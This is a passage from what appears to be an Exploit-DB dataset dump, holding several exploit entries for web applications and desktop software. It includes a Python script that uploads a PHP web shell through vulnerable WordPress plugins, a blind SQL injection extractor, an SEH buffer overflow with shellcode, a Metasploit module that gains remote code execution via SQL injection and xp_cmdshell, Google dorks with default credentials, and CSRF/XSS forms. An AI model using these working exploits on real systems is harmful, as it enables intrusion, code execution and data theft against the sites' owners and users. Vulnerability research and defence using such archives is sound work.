41540,"Multiple WordPress Plugins - Arbitrary File Upload import requests import random import string print ""---------------------------------------------------------------------"" print ""Multiple  Wordpress Plugin - Remote File Upload Exploit\nDiscovery: Larry W. Cashdollar\nExploit Author: Munir Njiru\nCWE: 434\n\n1. Zen App Mobile Native <=3.0 (CVE-2017-6104)\n2. Wordpress Plugin webapp-builder v2.0 (CVE-2017-1002002)\n3. Wordpress Plugin wp2android-turn-wp-site-into-android-app v1.1.4 CVE-2017-1002003)\n4.Wordpress Plugin mobile-app-builder-by-wappress v1.05 CVE-2017-1002001)\n5. Wordpress Plugin mobile-friendly-app-builder-by-easytouch v3.0 (CVE-2017-1002000)\n\nReference URLs:\nhttp://www.vapidlabs.com/advisory.php?v=178\nhttp://www.vapidlabs.com/advisory.php?v=179\nhttp://www.vapidlabs.com/advisory.php?v=180\nhttp://www.vapidlabs.com/advisory.php?v=181\nhttp://www.vapidlabs.com/advisory.php?v=182"" print ""---------------------------------------------------------------------"" victim = raw_input(""Please Enter victim host e.g. http://example.com: "") plug_choice=raw_input (""\n Please choose a number representing the plugin to attack: \n1. Zen App Mobile Native <=3.0\n2. Wordpress Plugin webapp-builder v2.0\n3. Wordpress Plugin wp2android-turn-wp-site-into-android-app v1.1.4\n4.Wordpress Plugin mobile-app-builder-by-wappress v1.05\n5. Wordpress Plugin mobile-friendly-app-builder-by-easytouch v3.0\n"") if plug_choice==""1"": 	plugin=""zen-mobile-app-native"" elif plug_choice==""2"": 	plugin=""webapp-builder"" elif plug_choice==""3"": 	plugin=""wp2android-turn-wp-site-into-android-app"" elif plug_choice==""4"": 	plugin=""mobile-app-builder-by-wappress"" elif plug_choice==""5"": 	plugin=""mobile-friendly-app-builder-by-easytouch"" else: 	print ""Invalid Plugin choice, I will now exit"" 	quit()	 slug = ""/wp-content/plugins/""+plugin+""/server/images.php"" target=victim+slug def definShell(size=6, chars=string.ascii_uppercase + string.digits):     return ''.join(random.choice(chars) for _ in range(size))  shellName= definShell()+"".php""  def checkExistence(): 	litmusTest = requests.get(target) 	litmusState = litmusTest.status_code 	if litmusState == 200: 		print ""\nTesting if vulnerable script is available\nI can reach the target & it seems vulnerable, I will attempt the exploit\nRunning exploit..."" 		exploit() 	else: 		print ""Target has a funny code & might not be vulnerable, I will now exit\n"" 		quit() 	 def exploit(): 	print ""\nGenerating Payload: ""+shellName+""\n"" 	myShell = {'file': (shellName, '<?php echo system($_GET[\'alien\']); ?>')} 	shellEmUp = requests.post(target, files=myShell) 	respShell = shellEmUp.text 	cleanURL = respShell.replace(""http://example.com/"",victim+""/wp-content/plugins/""+plugin+""/"") 	shellLoc = cleanURL.replace("" "", """") 	print ""Confirming shell upload by printing current user\n"" 	shellTest=requests.get(shellLoc+""?alien=whoami"") 	webserverUser=shellTest.text 	if webserverUser == """": 		print ""I can't run the command can you try manually on the browser: \n""+shellLoc+""?alien=whoami"" 		quit() 	else: 		print ""The current webserver user is: ""+webserverUser+""\n"" 		print ""Shell Can be controlled from the browser by running :\n""+shellLoc+""?alien=command"" 		quit()  if __name__ == ""__main__"": 	checkExistence()",remote,webapps,1
16935,"Bacula-Web 1.3.x < 5.0.3 - Multiple Vulnerabilities GotGeek Labs http://www.gotgeek.com.br/  Bacula-web 1.3.x - 5.0.3 Multiple Remote Vulnerabilities    [+] Description  Bacula-Web is a web based tool that provide you a summarized view of your bacula director. It obtain his information from your bacula catalog's database. It provide some usefull informations such as:     * Last 24 hours jobs status (completed, failed, waiting, etc.)     * Medias and Pool usage     * Last 7 days storage usage  The main advantages of this tool are     * it's web based, so you can reach it simply through your       preferred browser from anywhere     * it's pretty easy to install (you just need a LAMP server with       a valid Bacula catalog database connection)     * it contain a lot of information into a single page (have a       look on your last jobs for example)  This is a fairly high level Bacula management tool.    [+] Information  Title: Bacula-web 1.3.x - 5.0.3 Multiple Remote Vulnerabilities Google Dork: intitle:bacula-web ""Status"" Advisory: gg-004-2011 Date: 02-22-2011 Last update: 03-04-2011 Link: http://www.gotgeek.com.br/pocs/gg-004-2011.txt Tested on: FreeBSD 7.2-RELEASE + MySQL 5.x    [+] Vulnerabilities  Cross-site Scripting: Bacula-web is affected by cross-site scripting vulnerability because it fails to properly sanitize user-supplied input. An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.  XSS: http://target/bacula/report.php?default=1&server=Backup_inc<script>alert(""xss"")</script>  Blind SQL Injection: Bacula-web is also affected by blind SQL injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query. Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  *Blind SQLi: http://target/bacula/report.php?default=1&server=Backup_inc' and 1='2	#FALSE http://target/bacula/report.php?default=1&server=Backup_inc' and 1='1	#TRUE  *Need a valid job name at server variable with some data to get false or true page.   Affected Versions: (1)Bacula-web 5.0.3 (2)Bacula-web 1.38.9_1 (FreeBSD)  Other versions may also be vulnerable.    [+] Proof of Concept/Exploit  # $ python bacula-web.py -t 10.1.1.1 -d /bacula/ -j Backup_inc -p 80 # # [*] gotgeek labs # [*] http://gotgeek.com.br # # # [*] Checking report.php... # [+] Found! # [*] Let's get MySQL version.. Wait a moment... # [+] MySQL: 5.0.84 # # [*]Done!   #!/usr/bin/python #  import sys import httplib, socket import urllib, re from optparse import OptionParser  # You may also use ""MB"".. Check your target before! truestr = ""GB"" usage = ""./%prog -t <target> -d <dir> -j <job> -p <port>\n"" usage+= ""Example: ./%prog -t www.example.com -d /bacula-web/ -j BackupCatalog -p 80""  parser = OptionParser(usage=usage) parser.add_option(""-t"", action=""store"", dest=""target"",                   help=""target server"") parser.add_option(""-d"", action=""store"", dest=""dir"",                   help=""path to bacula-web"") parser.add_option(""-j"", action=""store"", dest=""job"",                   help=""bacula job name"") parser.add_option(""-p"", action=""store"", dest=""port"",                   help=""server port"") (options, args) = parser.parse_args()  def banner():     print ""\n[*] gotgeek labs""     print ""[*] http://gotgeek.com.br\n\n""  if len(sys.argv) < 5:     banner()     parser.print_help()     sys.exit(1)   def checkurl():     try:         print ""[*] Checking report.php...""         conn = httplib.HTTPConnection(options.target+"":""+options.port)         conn.request(""GET"", options.dir + ""report.php"")         r1 = conn.getresponse()         if r1.status == 200:             print ""[+] Found!""         else:             print ""[-] NOT Found!\n\n""             sys.exit(1)     except socket.error, msg:         print ""[-] Can't connect to the target!\n\n""         sys.exit(1)   def geturl(sqli):     try:         check = urllib.urlopen(""http://""+options.target+"":""+options.port+options.dir+sqli).read()     except:         print ""[-] Can't connect to the target!\n\n""         sys.exit(1)     return check   def getmysql(gg):     for i in range(43,58):         request = (""report.php?default=1&server=""+options.job+""'%20and%20ascii(substring(@@version,""+str(gg)+"",1))='""+str(i))         result = geturl(request)         if re.search(truestr,result):             gg = gg+1             sys.stdout.write(chr(i))             sys.stdout.flush()             getmysql(gg)             break    def main():     gg = 1     banner()     checkurl()     print ""[*] Let's get MySQL version.. Wait a moment...""     sys.stdout.write(""[+] MySQL: "")     getmysql(gg)     print ""\n\n[*]Done!\n\n""  if __name__ == ""__main__"":     main()    [+] References  (1)http://bacula-web.dflc.ch/index.php/home.html (2)http://www.freshports.org/www/bacula-web/    [+] Credits  b0telh0",remote,webapps,1
28995,"WebTester 5.x - Multiple Vulnerabilities ==========================================================================================  WebTester 5.x Multiple Vulnerabilities  ==========================================================================================   :----------------------------------------------------------------------------------------------------------------------------------------:  : # Exploit Title : WebTester 5.x Multiple Vulnerabilities   : # Date : 15 October 2013  : # Author : X-Cisadane  : # CMS Developer : http://epplersoft.com/webtester.html  : # CMS Source Code : http://sourceforge.net/projects/webtesteronline/  : # Version : ALL  : # Category : Web Applications  : # Vulnerability : SQL Injection, Arbitrary File Upload, PHPInfo() Disclosure, Leftover install.php File : # Tested On : Google Chrome Version 26.0.1410.64 m (Windows XP SP 3 32-Bit English)  : # Greetz to : X-Code, Borneo Crew, Depok Cyber, Explore Crew, CodeNesia, Bogor-H, Jakarta Anonymous Club, Jabar Cyber, Winda Utari  :----------------------------------------------------------------------------------------------------------------------------------------:   DORKS (How to find the target) :  ================================  intext:Copyright © 2003 - 2010 Eppler Software  inurl:/go.php?testID=  intitle:WebTester Online Testing  Or use your own Google Dorks :)   Proof of Concept   ================    [ 1 ] SQL Injection  POC : http://[Site]/[Path]/startTest.php?FirstName=a&LastName=a&TestID=['SQLi]     [ 2 ] Arbitrary File Upload through TinyMCE (plugins/filemanager)   Webster 5.x has a built-in WYSIWYG Editor, that is TinyMCE. The attacker can upload file through the TinyMCE File Manager.  It can be found in tiny_mce/plugins/filemanager.   Poc : http://[Site]/[Path]/tiny_mce/plugins/filemanager/InsertFile/insert_file.php  Example the target is http://server/  Change the url to http://server/tiny_mce/plugins/filemanager/InsertFile/insert_file.php  Pic #1 : http://i40.tinypic.com/117z390.png  Then tick : Insert filetype icon, Insert file size & Insert file modification date.  Click upload and wait until the file sent to the server.  Pic #2 : http://i39.tinypic.com/2wluaon.png  Pic #3 : http://i40.tinypic.com/2uh0fir.png  If the file was successfully uploaded, check in the /test-images/ directory.    [ 3 ] PHPInfo() Disclosure  POC : http://[Site]/[Path]/phpinfo.php    [ 4 ] Leftover install.php File  POC : http://[Site]/[Path]/install.php   Bonus : Default Username and Password  Username : admin  Password : admin  Admin Control Panel : http://[Site]/[Path]/admin/",remote,webapps,1
28955,"Internet Haut Debit Mobile PCW_MATMARV1.0.0B03 - Local Buffer Overflow (SEH) #!/usr/bin/python #Exploit Title:Internet Haut Debit Mobile Buffer Overflow SEH  #Software Link:https://app.box.com/s/4h9cm20hp5iiask8rwrm #Poc video demo :http://www.youtube.com/watch?v=sAHfjmNHiow&feature=youtu.be #Version:PCW_MATMARV1.0.0B03 #Date found:    10.10.2013  #Date published:10.10.2013 #Exploit Author: metacom #RST #Tested on: Windows XP sp3 En  from struct import pack   file=""NetConfig.ini"" print ""[*]Copy NetConfig.ini to C:\Program Files\Internet Haut Debit Mobile\n"" print ""[*]Open Program Go to (parameter->options)\n"" print ""[*]Click Buffer Overflow SEH and press (Vue -> View)\n""  junk=""\x41"" * 461 nseh=""\xeb\x42\x90\x90""  seh=pack('<I',0x0F9A196A) nops=""\x90"" * 80 ##\x00\x0a\x0d shellcode=(""\xba\x50\x3e\xf5\xa5\xda\xd7\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"" ""\x33\x83\xc3\x04\x31\x53\x0e\x03\x03\x30\x17\x50\x5f\xa4\x5e"" ""\x9b\x9f\x35\x01\x15\x7a\x04\x13\x41\x0f\x35\xa3\x01\x5d\xb6"" ""\x48\x47\x75\x4d\x3c\x40\x7a\xe6\x8b\xb6\xb5\xf7\x3d\x77\x19"" ""\x3b\x5f\x0b\x63\x68\xbf\x32\xac\x7d\xbe\x73\xd0\x8e\x92\x2c"" ""\x9f\x3d\x03\x58\xdd\xfd\x22\x8e\x6a\xbd\x5c\xab\xac\x4a\xd7"" ""\xb2\xfc\xe3\x6c\xfc\xe4\x88\x2b\xdd\x15\x5c\x28\x21\x5c\xe9"" ""\x9b\xd1\x5f\x3b\xd2\x1a\x6e\x03\xb9\x24\x5f\x8e\xc3\x61\x67"" ""\x71\xb6\x99\x94\x0c\xc1\x59\xe7\xca\x44\x7c\x4f\x98\xff\xa4"" ""\x6e\x4d\x99\x2f\x7c\x3a\xed\x68\x60\xbd\x22\x03\x9c\x36\xc5"" ""\xc4\x15\x0c\xe2\xc0\x7e\xd6\x8b\x51\xda\xb9\xb4\x82\x82\x66"" ""\x11\xc8\x20\x72\x23\x93\x2e\x85\xa1\xa9\x17\x85\xb9\xb1\x37"" ""\xee\x88\x3a\xd8\x69\x15\xe9\x9d\x86\x5f\xb0\xb7\x0e\x06\x20"" ""\x8a\x52\xb9\x9e\xc8\x6a\x3a\x2b\xb0\x88\x22\x5e\xb5\xd5\xe4"" ""\xb2\xc7\x46\x81\xb4\x74\x66\x80\xd6\x1b\xf4\x48\x37\xbe\x7c"" ""\xea\x47"") header =""\x68\x74\x74\x70\x3a\x2f\x2f"" exploit=header + junk + nseh + seh + nops + shellcode poc=""\x5b\x42\x75\x66\x66\x65\x72\x20\x4f\x76\x65\x72\x66\x6c\x6f\x77\x20\x53\x45\x48\x5d\n"" poc+=""\x4e\x61\x6d\x65\x3d"" + ""\n"" poc+=""\x55\x73\x65\x72\x4e\x61\x6d\x65\x3d"" + exploit + ""\n"" poc+=""\x55\x73\x65\x72\x50\x61\x73\x73\x3d"" +""\n"" poc+=""\x44\x69\x61\x6c\x4e\x75\x6d\x3d\x2a\x39\x39\x23"" + ""\n""      poc+=""\x49\x73\x41\x75\x74\x6f\x47\x65\x74\x41\x50\x4e\x3d\x30"" + ""\n""  poc+=""\x41\x50\x4e\x3d\x77\x77\x77\x2e\x69\x61\x6d\x67\x70\x72\x73\x32\x2e\x6d\x61"" + ""\n""             poc+=""\x49\x73\x41\x75\x74\x6f\x47\x65\x74\x44\x4e\x53\x3d\x31"" + ""\n""  poc+=""\x4d\x61\x69\x6e\x44\x4e\x53\x61\x64\x64\x72\x3d"" + ""\n""  poc+=""\x41\x6c\x74\x44\x4e\x53\x41\x64\x64\x72\x3d"" + ""\n""  poc+=""\x49\x73\x41\x75\x74\x6f\x47\x65\x74\x50\x44\x50\x3d\x31 "" + ""\n""  poc+=""\x70\x64\x70\x41\x64\x64\x72\x3d"" + ""\n""  poc+=""\x70\x64\x70\x54\x79\x70\x65\x3d\x49\x50"" + ""\n""  poc+=""\x41\x75\x74\x68\x54\x79\x70\x65\x3d\x50\x41\x50"" + ""\n""  poc+=""\x61\x73\x6b\x55\x73\x65\x72\x41\x6e\x64\x50\x61\x73\x73\x3d\x30"" + ""\n""  poc+=""\x53\x61\x76\x65\x75\x73\x65\x72\x41\x6e\x64\x50\x61\x73\x73\x3d\x30"" + ""\n""  poc+=""\x49\x73\x46\x61\x63\x74\x6f\x72\x79\x44\x65\x66\x61\x75\x6c\x74\x3d\x31"" + ""\n""           poc+=""\x44\x65\x6e\x69\x45\x64\x69\x74\x44\x65\x6c\x65\x74\x65\x3d\x31"" + ""\n""           poc+=""\x49\x73\x44\x66\x61\x75\x6c\x74\x3d\x31"" + ""\n""   try:     print ""[*]Creating exploit file...\n""     writeFile = open (file, ""w"")     writeFile.write( poc )     writeFile.close()     raw_input(""[*]File successfully created!\nPress Enter"") except:     print ""[!] Error while creating file!""",local,local,1
37858,"Adobe Flash - Out-of-Bounds Memory Read While Parsing a Mutated '.TTF' File Embedded in SWF Source: https://code.google.com/p/google-security-research/issues/detail?id=363&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id  The following access violation was observed in the Adobe Flash Player plugin:  (1ba8.1c60): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. *** ERROR: Symbol file could not be found.  Defaulted to export symbols for FlashPlayer.exe -  eax=0004c800 ebx=00000000 ecx=08982000 edx=00002588 esi=00001200 edi=0042d46c eip=017723c0 esp=0042d278 ebp=0042d3c4 iopl=0         nv up ei pl nz na pe nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206 FlashPlayer!IAEModule_IAEKernel_UnloadModule+0x254f0: 017723c0 8b0408          mov     eax,dword ptr [eax+ecx] ds:002b:089ce800=????????  0:000> kb ChildEBP RetAddr  Args to Child               WARNING: Stack unwind information not available. Following frames may be wrong. 0042d3c4 0177cfaf 0042d3e0 0042d46c 00000001 FlashPlayer!IAEModule_IAEKernel_UnloadModule+0x254f0 0042d3ec 0177d112 0042d414 0042d46c 00001376 FlashPlayer!IAEModule_IAEKernel_UnloadModule+0x300df 0042d424 0177d4c2 0042d454 0042d46c 00000006 FlashPlayer!IAEModule_IAEKernel_UnloadModule+0x30242 0042d4e0 0176ec7a 00000000 0042d540 03497440 FlashPlayer!IAEModule_IAEKernel_UnloadModule+0x305f2 0042d544 01788715 08875020 47535542 6c61746e FlashPlayer!IAEModule_IAEKernel_UnloadModule+0x21daa 0042d7d8 01775c95 0042d814 01775f31 01775f41 FlashPlayer!IAEModule_IAEKernel_UnloadModule+0x3b845 0042d7e0 01775f31 01775f41 03497440 00000000 FlashPlayer!IAEModule_IAEKernel_UnloadModule+0x28dc5 0042d828 017834d2 03497440 00000000 00000030 FlashPlayer!IAEModule_IAEKernel_UnloadModule+0x29061 00000000 00000000 00000000 00000000 00000000 FlashPlayer!IAEModule_IAEKernel_UnloadModule+0x36602  0:000> db ecx 08982000  35 00 00 00 01 00 00 00-00 00 00 00 00 00 00 ff  5............... 08982010  00 00 00 00 00 00 00 00-01 00 00 00 00 00 00 00  ................ 08982020  80 a4 b7 01 00 00 00 00-00 00 00 00 00 10 00 00  ................ 08982030  00 00 00 00 18 a8 b7 01-20 50 87 08 00 00 00 00  ........ P...... 08982040  03 30 02 00 49 00 00 00-01 00 00 00 00 00 00 00  .0..I........... 08982050  00 00 00 ff 00 00 00 00-00 00 00 00 01 00 00 00  ................ 08982060  00 00 00 00 80 a4 b7 01-00 00 00 00 00 00 00 00  ................ 08982070  00 10 00 00 00 00 00 00-18 a8 b7 01 20 50 87 08  ............ P..  0:000> !address ecx [...] Usage:                  <unknown> Base Address:           08906000 End Address:            08990000 Region Size:            0008a000 State:                  00001000	MEM_COMMIT Protect:                00000004	PAGE_READWRITE Type:                   00020000	MEM_PRIVATE Allocation Base:        087f0000 Allocation Protect:     00000001	PAGE_NOACCESS  Notes:  - Reliably reproduces with latest Adobe Flash Player Projector for Windows and Google Chrome for Windows.  - The out-of-bounds read appears to be caused by an overly large index value (stored in the ""EAX"" register at the time of the crash) relative to a dynamically allocated buffer pointed to by ""ECX"".  - The 32-bit value read from the unmapped memory address is in fact a pointer, and is used to immediately read 12 bytes from in one function up the call chain.  - Attached samples: signal_sigsegv_7ffff710e9d3_881_11431348555663755408.ttf.swf (crashing file), 11431348555663755408.ttf.swf (original file).  Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/37858.zip",remote,dos,0
33977,"Torque Game Engine - Multiple Denial of Service Vulnerabilities source: https://www.securityfocus.com/bid/40102/info  Torque Game Engine is prone to multiple denial-of-service vulnerabilities.  An attacker with valid login credentials can exploit these issues to cause the application using the engine to crash, resulting in a denial-of-service condition. Other attacks may also be possible.  Torque 2D game engine and Torque 3D game engine are vulnerable.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/33977.zip",remote,dos,1
46782,"AIS logistics ESEL-Server - Unauthenticated SQL Injection Remote Code Execution (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::MSSQL_COMMANDS   include Msf::Exploit::Remote::Tcp   include Msf::Exploit::CmdStager    def initialize(info = {})     super(update_info(info,       'Name'           => 'AIS logistics ESEL-Server Unauth SQL Injection RCE',       'Description'    => %q{         This module will execute an arbitrary payload on an ""ESEL"" server used by the         AIS logistic software. The server typically listens on port 5099 without TLS.         There could also be server listening on 5100 with TLS but the port 5099 is         usually always open.         The login process is vulnerable to an SQL Injection. Usually a MSSQL Server         with the 'sa' user is in place.          This module was verified on version 67 but it should also run on lower versions.         An fixed version was created by AIS in September 2017. However most systems         have not been updated.          In regard to the payload, unless there is a closed port in the web server,         you dont want to use any ""bind"" payload. You want a ""reverse"" payload,         probably to your port 80 or to any other outbound port allowed on the firewall.          Currently, one delivery method is supported          This method takes advantage of the Command Stager subsystem. This allows using         various techniques, such as using a TFTP server, to send the executable. By default         the Command Stager uses 'wcsript.exe' to generate the executable on the target.          NOTE: This module will leave a payload executable on the target system when the         attack is finished.        },       'Author'         =>         [           'Manuel Feifel'         ],       'License'        => MSF_LICENSE,       'References'     =>         [           ['CVE', '2019-10123'],         ],       'Platform'       => 'win',       'Arch'           => [ ARCH_X86, ARCH_X64 ],       'Payload'        =>         {           'BadChars'  => ""\x00\xff\x27"",         },       'Targets'        =>         [           [ 'Automatic', { } ],         ],       'CmdStagerFlavor' => 'vbs',       'DefaultTarget'  => 0,       'DisclosureDate' => '2019-03-27',       'DefaultOptions' =>         {           'RPORT' => 5099         },       ))   end    # This is method required for the CmdStager to work...   def execute_command(cmd, _opts)     cmd_xp = ""EXEC master..xp_cmdshell '#{cmd}'""     send_login_msg(create_login_msg_sql(cmd_xp))   end    # prepends the required length to the message and sends it to the server   def send_login_msg(login_msg, check_response = true)     length = login_msg.length     length += length.to_s.length     login_msg = ""#{length}#{login_msg}""      connect      sock.put(login_msg)     response = sock.recv(10000)      if check_response       if (response.include? 'Zugangsdaten Falsch') && (response.length > (length - 20))         print_good('Correct response received => Data send successfully')       else         print_warning('Wrong response received => Probably data could not be sent successfully')       end     end      return response   ensure     # Every time a new Connection is required     disconnect   end    # embeds a sql command into the login message   def create_login_msg_sql(sql_cmd)     return create_login_msg(""#{rand(1_000..9_999)}'; #{sql_cmd}--"")   end    # create a plain login message   def create_login_msg(pw)     delim = ""\xFF""     login_str = ""#{delim}000000#{delim}20180810213226#{delim}01#{delim}60""\                 ""#{delim}02#{delim}1111#{delim}#{pw}#{delim}AAAAA#{delim}120""    end    def check     int = rand(1..1_000)     response_bypass = send_login_msg(create_login_msg(""#{rand(1_000..9_999)}' OR #{int}=#{int}--""), false)     if response_bypass.include? 'Zugangsdaten OK'       CheckCode::Vulnerable     else       print_status(""Response was: #{response_bypass}"")       CheckCode::Safe     end   end    def exploit     # enable xp cmdshell, used to execute commands later     # Software uses the 'sa' user by default     send_login_msg(create_login_msg_sql(mssql_xpcmdshell_enable))     # The porotocol has no limites on max-data     execute_cmdstager({ :linemax => 1500 })     print_warning('The payload is left on the client in the \%TEMP\% Folder of the corresponding user.')     print_status('Stager should now be executed.')   end end",remote,remote,1
31501,Quick Classifieds 1.0 - 'controlpannel/createL.php3?DOCUMENT_ROOT' Remote File Inclusion source: https://www.securityfocus.com/bid/28417/info                        Quick Classifieds is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.                        Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.                        Quick Classifieds 1.0 is vulnerable; other versions may also be affected.   http://www.example.com/QuickSystems_path/controlpannel/createL.php3?DOCUMENT_ROOT=ZoRLu.txt?,remote,webapps,1
38753,"WordPress Plugin Event Easy Calendar - Multiple Cross-Site Request Forgery Vulnerabilities source: https://www.securityfocus.com/bid/62269/info  The Event Easy Calendar plugin for WordPress is prone to multiple cross-site request-forgery vulnerabilities.  Exploiting these issues may allow a remote attacker to perform certain unauthorized actions in the context of the affected application. Other attacks are also possible.  Event Easy Calendar 1.0.0 is vulnerable; other versions may also be affected.    f of Concept ======================== Add Customer <form method=""post"" action=""http://www.example.com/wp-admin/admin-ajax.php"";>     <input type=""hidden"" name=""data-table_length"" value=""10"">     <input type=""hidden"" name=""radioservice"" value=""1"">     <input type=""hidden"" name=""hdServiceTypeDDL"" value="""">       <input type=""hidden"" name=""uxTxtControl1"" value=""new () user com"">     <input type=""hidden"" name=""uxTxtControl2"" value=""<script>alert(1)</script>"">     <input type=""hidden"" name=""hiddeninputname"" value="""">        <input type=""hidden"" name=""hiddeninputname"" value="""">        <input type=""hidden"" name=""uxHdnTotalCost"" value=""0.00"">     <input type=""hidden"" name=""param"" value=""addNewCustomer"">     <input type=""hidden"" name=""action"" value=""bookingsLibrary"">     <input type=""submit"" value=""Add Customer""> </form>  Update Customer <form method=""post"" action=""http://www.example.com/wp-admin/admin-ajax.php"";>     <input type=""hidden"" name=""data-table_length"" value=""10"">     <input type=""hidden"" name=""radioservice"" value=""2"">     <input type=""hidden"" name=""hdServiceTypeDDL"" value="""">       <input type=""hidden"" name=""uxTxtControl1"" value=""new () user com"">     <input type=""hidden"" name=""uxTxtControl2"" value=""NewUser"">     <input type=""hidden"" name=""hiddeninputname"" value="""">        <input type=""hidden"" name=""hiddeninputname"" value="""">        <input type=""hidden"" name=""uxHdnTotalCost"" value=""100.00"">     <input type=""hidden"" name=""customerId"" value=""3"">     <input type=""hidden"" name=""uxCustomerEmail"" value=""new () user com"">     <input type=""hidden"" name=""param"" value=""upDateCustomer"">     <input type=""hidden"" name=""action"" value=""bookingsLibrary"">     <input type=""submit"" value=""Update Customer""> </form>  New Booking <form method=""post"" action=""http://www.example.com/wp-admin/admin-ajax.php"";>     <input type=""hidden"" name=""altField"" value=""2013-08-15"">     <input type=""hidden"" name=""serviceId"" value=""2"">     <input type=""hidden"" name=""customerId"" value=""5"">     <input type=""hidden"" name=""uxCouponCode"" value="""">       <input type=""hidden"" name=""uxNotes"" value="""">        <input type=""hidden"" name=""bookingTime"" value=""900"">     <input type=""hidden"" name=""param"" value=""frontEndMutipleDates"">     <input type=""hidden"" name=""action"" value=""bookingsLibrary"">     <input type=""submit"" value=""New Booking""> </form>  Add Service <form method=""post"" action=""http://www.example.com/wp-admin/admin-ajax.php"";>     <input type=""hidden"" name=""uxServiceColor"" value=""#00ff00"">     <input type=""text"" name=""uxServiceName"" value=""CSRF service<script>alert(1)</script>"">     <input type=""hidden"" name=""uxServiceCost"" value=""0"">     <input type=""hidden"" name=""uxServiceType"" value=""0"">     <input type=""hidden"" name=""uxMaxBookings"" value=""1"">     <input type=""hidden"" name=""uxFullDayService"" value="""">     <input type=""hidden"" name=""uxMaxDays"" value=""1"">     <input type=""hidden"" name=""uxCostType"" value=""0"">     <input type=""hidden"" name=""uxServiceHours"" value=""00"">     <input type=""hidden"" name=""uxServiceMins"" value=""30"">     <input type=""hidden"" name=""uxStartTimeHours"" value=""9"">     <input type=""hidden"" name=""uxStartTimeMins"" value=""0"">     <input type=""hidden"" name=""uxStartTimeAMPM"" value=""AM"">     <input type=""hidden"" name=""uxEndTimeHours"" value=""5"">     <input type=""hidden"" name=""uxEndTimeMins"" value=""0"">     <input type=""hidden"" name=""uxEndTimeAMPM"" value=""PM"">     <input type=""hidden"" name=""param"" value=""addService"">     <input type=""hidden"" name=""action"" value=""dashboardLibrary"">     <input type=""submit"" value=""Add Service""> </form>  Add Block Out <form method=""post"" action=""http://www.example.com/wp-admin/admin-ajax.php"";>     <input type=""hidden"" name=""uxExceptionsServices"" value=""4"">     <input type=""hidden"" name=""uxExceptionsIntervals"" value=""1"">     <input type=""hidden"" name=""uxExceptionsRepeatDay"" value=""1"">     <input type=""hidden"" name=""uxExceptionsStartsOn"" value="""">     <input type=""hidden"" name=""uxExceptionsStartTimeHours"" value=""09"">     <input type=""hidden"" name=""uxExceptionsStartTimeMins"" value=""00"">     <input type=""hidden"" name=""uxExceptionsStartTimeAMPM"" value=""AM"">     <input type=""hidden"" name=""uxExceptionsEndTimeHours"" value=""05"">     <input type=""hidden"" name=""uxExceptionsEndTimeMins"" value=""00"">     <input type=""hidden"" name=""uxExceptionsEndTimeAMPM"" value=""PM"">     <input type=""hidden"" name=""uxExceptionsDay"" value=""0"">     <input type=""hidden"" name=""uxExceptionsDayEndsOn"" value="""">     <input type=""hidden"" name=""uxExceptionsWeekDay1"" value=""Sun"">     <input type=""hidden"" name=""uxExceptionsWeekDay2"" value=""Wed"">     <input type=""hidden"" name=""uxExceptionsRepeatWeeks"" value=""9"">     <input type=""hidden"" name=""uxExceptionsWeekStartsOn"" value=""2013-08-22"">     <input type=""hidden"" name=""uxExceptionsWeekStartTimeHours"" value=""09"">     <input type=""hidden"" name=""uxExceptionsWeekStartTimeMins"" value=""00"">     <input type=""hidden"" name=""uxExceptionsWeekStartTimeAMPM"" value=""AM"">     <input type=""hidden"" name=""uxExceptionsWeekEndTimeHours"" value=""05"">     <input type=""hidden"" name=""uxExceptionsWeekEndTimeMins"" value=""00"">     <input type=""hidden"" name=""uxExceptionsWeekEndTimeAMPM"" value=""PM"">     <input type=""hidden"" name=""uxExceptionsWeek"" value=""0"">     <input type=""hidden"" name=""uxExceptionsWeekEndsOn"" value="""">     <input type=""hidden"" name=""param"" value=""insertExceptionWeeks"">     <input type=""hidden"" name=""action"" value=""dashboardLibrary"">     <input type=""submit"" value=""Add Block Out""> </form>  Add Cupon <form method=""post"" action=""http://www.example.com/wp-admin/admin-ajax.php"";>     <input type=""hidden"" name=""uxDefaultCoupon"" value=""XSS<script>alert('xss')</script>"">     <input type=""hidden"" name=""uxValidFrom"" value=""2013-08-15"">     <input type=""hidden"" name=""uxValidUpto"" value=""2013-08-22"">     <input type=""hidden"" name=""uxAmount"" value=""50"">     <input type=""hidden"" name=""uxDdlAmountType"" value=""1"">     <input type=""hidden"" name=""uxApplicableOnAllProducts"" value=""1"">     <input type=""hidden"" name=""uxDdlBookingServices"" value=""4"">     <input type=""hidden"" name=""param"" value=""addCoupons"">     <input type=""hidden"" name=""action"" value=""dashboardLibrary"">     <input type=""submit"" value=""Add Cupon""> </form>  Default Settings <form method=""post"" action=""http://www.example.com/wp-admin/admin-ajax.php"";>     <input type=""hidden"" name=""uxDdlDefaultCurrency"" value=""United States Dollar"">     <input type=""hidden"" name=""uxDdlDefaultCountry"" value=""United States of America"">     <input type=""hidden"" name=""uxDefaultDateFormat"" value=""0"">     <input type=""hidden"" name=""uxDefaultTimeFormat"" value=""0"">     <input type=""hidden"" name=""uxDefaultTimeZone"" value=""-5.0"">     <input type=""hidden"" name=""uxServiceDisplayFormat"" value=""0"">     <input type=""hidden"" name=""param"" value=""updateGeneralSettings"">     <input type=""hidden"" name=""action"" value=""dashboardLibrary"">     <input type=""submit"" value=""Default Settings""> </form>  Reminder Settings <form method=""post"" action=""http://www.example.com/wp-admin/admin-ajax.php"";>     <input type=""hidden"" name=""uxReminderSettings"" value=""1"">     <input type=""hidden"" name=""uxReminderInterval"" value=""1 hour"">     <input type=""hidden"" name=""param"" value=""UpdateReminderSettings"">     <input type=""hidden"" name=""action"" 